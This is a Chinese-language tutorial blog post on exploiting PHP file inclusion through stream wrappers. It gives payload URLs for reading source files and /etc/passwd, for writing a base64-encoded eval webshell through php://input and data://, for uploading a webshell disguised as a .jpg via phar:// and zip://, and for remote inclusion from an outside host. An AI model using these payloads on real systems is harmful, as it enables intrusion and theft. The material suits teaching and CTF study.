本地文件包含（Local File Include） 远程文件包含（Remote File Include），大概就是一个文件里面包含另外一个文件，程序员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。

### [](https://smelond.com/2018/09/04/LFI%E4%BB%A5%E5%8F%8ARF(%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB)%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/#%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%BD%E6%95%B0 "包含文件的函数")包含文件的函数

- require
- include
- require_once
- include_once
- 包含函数一共有4个，主要作用为包含并允许指定文件。  
    比如include($file)，当$file变量可控的情况下，我们就可以包含任意文件，从而达到getshell的目的。  
    在不同的配置环境下，可以包含不同的文件。因此又分为远程文件包含和本地文件包含。  
    在allow_url_include = On以及allow_url_fopen = On时，允许远程包含文件，而默认情况下allow_url_include = Off  
    PHP.ini：  
    在php5.2以上，allow_url_fopen ：on 默认开启，allow_url_include：off 默认关闭  
    _文件包含是否支持%00截断取决于：PHP版本<=5.2 可以使用%00进行截断。_

### [](https://smelond.com/2018/09/04/LFI%E4%BB%A5%E5%8F%8ARF(%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB)%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/#php%E4%BC%AA%E5%8D%8F%E8%AE%AE "php伪协议")php伪协议

#### [](https://smelond.com/2018/09/04/LFI%E4%BB%A5%E5%8F%8ARF(%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB)%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/#php%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%9C%89%EF%BC%9A "php的伪协议有：")php的伪协议有：

|   |   |
|---|---|
|1  <br>2  <br>3  <br>4  <br>5  <br>6  <br>7  <br>8  <br>9  <br>10  <br>11  <br>12  <br>13  <br>14|php:// — 访问各个输入/输出流（I/O streams）  <br>file:// — 访问本地文件系统  <br>phar:// — PHP 归档  <br>zip:// - 压缩流  <br>bzip2:// - 压缩流  <br>zlib:// — 压缩流  <br>data:// — 数据（RFC 2397）  <br>http:// — 访问 HTTP(s) 网址  <br>ftp:// — 访问 FTP(s) URLs  <br>glob:// — 查找匹配的文件路径模式  <br>ssh2:// — Secure Shell 2  <br>rar:// — RAR  <br>ogg:// — 音频流  <br>expect:// — 处理交互式的流|

zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。

#### [](https://smelond.com/2018/09/04/LFI%E4%BB%A5%E5%8F%8ARF(%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB)%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/#%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%9A "常用的伪协议：")常用的伪协议：

|   |   |
|---|---|
|1  <br>2  <br>3  <br>4  <br>5  <br>6  <br>7|php:// — 访问各个输入/输出流（I/O streams）  <br>file:// — 访问本地文件系统  <br>phar:// — PHP 归档  <br>zip:// — 压缩流  <br>data:// — 数据（RFC 2397）  <br>http:// — 访问 HTTP(s) 网址  <br>ftp:// — 访问 FTP(s) URLs|

#### [](https://smelond.com/2018/09/04/LFI%E4%BB%A5%E5%8F%8ARF(%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB)%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/#php-%E5%8D%8F%E8%AE%AE "php://协议")php://协议

|   |   |
|---|---|
|1  <br>2|php://filter  <br>php://input|

php://filter用于读取源码，php://input用于执行php代码。

php://filter：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，主要用于读取文件源代码并进行base64编码输出。  

|   |   |
|---|---|
|1  <br>2|http://www.inc.com/inc.php?file=php://filter/read=convert.base64-encode/resource=./config/db.php  <br>输出：PD9waHAgDQokY29uPW15c3FsaV9jb25uZWN0KCJsb2NhbGhvc3QiLCJyb290Iiwicm9vdCIsImRiIik7IA0KaWYgKCEkY29uKSANCnsgDQogICAgZGllKCLov57mjqXplJnor686ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsgDQp9IA0K|

将base64解码就可以看到db.php文件内容

php://input：访问各个输入/输出流。CTF中经常使用file_get_contents获取php://input内容(POST)，需要开启allow_url_include，并且当enctype=”multipart/form-data”的时候 php://input是无效的  
写入一句话  

|   |   |
|---|---|
|1  <br>2  <br>3  <br>4  <br>5|http://www.inc.com/inc.php?file=php://input  <br>post数据:  <br><?php   <br>echo file_put_contents("test.php",base64_decode("PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4="));  <br>?>|

#### [](https://smelond.com/2018/09/04/LFI%E4%BB%A5%E5%8F%8ARF(%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB)%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/#file-%E5%8D%8F%E8%AE%AE "file://协议")file://协议

file://：用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响，file://还经常和curl函数(SSRF)结合在一起。  

|   |   |
|---|---|
|1|http://www.inc.com/inc.php?file=file:///etc/passwd|

#### [](https://smelond.com/2018/09/04/LFI%E4%BB%A5%E5%8F%8ARF(%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB)%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/#phar-%E5%8D%8F%E8%AE%AE "phar://协议")phar://协议

phar://：PHP 归档，常常跟文件包含，文件上传结合着考察。当文件上传仅仅校验mime类型与文件后缀，可以通过以下命令进行利用。  

|   |   |
|---|---|
|1  <br>2  <br>3|利用方式：写入一句话shell.php -> 压缩为shell.zip -> 修改后缀为shell.jpg ->上传到网站 -> phar://shell.jpg/shell.php  <br>shell.php->shell.zip->shell.jpg->upload->phar://shell.jpg/shell.php  <br>http://www.inc.com/inc.php?file=phar://shell.jpg/shell.php|

#### [](https://smelond.com/2018/09/04/LFI%E4%BB%A5%E5%8F%8ARF(%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB)%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/#zip-%E5%8D%8F%E8%AE%AE "zip://协议")zip://协议

zip://：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，,类似phar://，使用如下：  
利用方式：  

|   |   |
|---|---|
|1  <br>2  <br>3|写入一句话shell.php -> 压缩为shell.zip -> 修改后缀为shell.jpg ->上传到网站 -> phar://shell.jpg/shell.php  <br>shell.php->shell.zip->shell.jpg->upload->phar://shell.jpg%23shell.php 	// %23 == #  <br>http://www.inc.com/inc.php?file=zip://./shell.jpg%23shell.php|

#### [](https://smelond.com/2018/09/04/LFI%E4%BB%A5%E5%8F%8ARF(%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB)%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/#bzip2-%E5%8D%8F%E8%AE%AE-amp-amp-zlib "bzip2://协议 && zlib://")bzip2://协议 && zlib://

bzip2://协议 && zlib://：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用:  

|   |   |
|---|---|
|1  <br>2  <br>3  <br>4  <br>5  <br>6  <br>7|compress.bzip2://file.bz2 	//处理的是 '.bz2' 后缀的压缩包  <br>http://www.inc.com/inc.php?file=compress.bzip2://D:/soft/phpStudy/WWW/shell.jpg  <br>http://www.inc.com/inc.php?file=compress.bzip2://./shell.jpg  <br>  <br>compress.zlib://file.gz 	//处理的是 '.gz' 后缀的压缩包  <br>http://www.inc.com/inc.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg  <br>http://www.inc.com/inc.php?file=compress.zlib://./file.jpg|

#### [](https://smelond.com/2018/09/04/LFI%E4%BB%A5%E5%8F%8ARF(%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB)%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/#data-%E5%8D%8F%E8%AE%AE "data://协议")data://协议

data://：需满足allow_url_fopen，allow_url_include同时开启才能使用:  

|   |   |
|---|---|
|1  <br>2  <br>3  <br>4  <br>5|http://www.inc.com/inc.php?file=data://text/plain,<?php phpinfo()?>  <br>http://www.inc.com/inc.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=  <br>http://www.inc.com/inc.php?file=data:text/plain,<?php phpinfo()?>  <br>http://www.inc.com/inc.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=  <br>http://www.inc.com/inc.php?file=data://text/plain;base64,PD9waHAgZWNobyBmaWxlX3B1dF9jb250ZW50cygidGVzdC5waHAiLGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFnWlhaaGJDZ2tYMUJQVTFSYkoyTmpKMTBwUHo0PSIpKTs/Pg==|

#### [](https://smelond.com/2018/09/04/LFI%E4%BB%A5%E5%8F%8ARF(%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB)%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/#http-amp-amp-ftp "http:// && ftp://")http:// && ftp://

http:// && ftp:// 需满足allow_url_fopen，allow_url_include同时开启才能使用，可访问内网主机主机  

|   |   |
|---|---|
|1  <br>2  <br>3|?file=[http\|https\|ftp]://xxx/file.txt[?%23]	远程代码执行  <br>?file=[http\|https\|ftp]://xxx/file 	利用XSS执行任意代码  <br>?file=http://xxx/xss.php?xss=phpcode 	远程代码执行|

---

参考：  
[http://www.freebuf.com/column/148886.html](http://www.freebuf.com/column/148886.html)  
[https://www.jianshu.com/p/0a8339fcc269](https://www.jianshu.com/p/0a8339fcc269)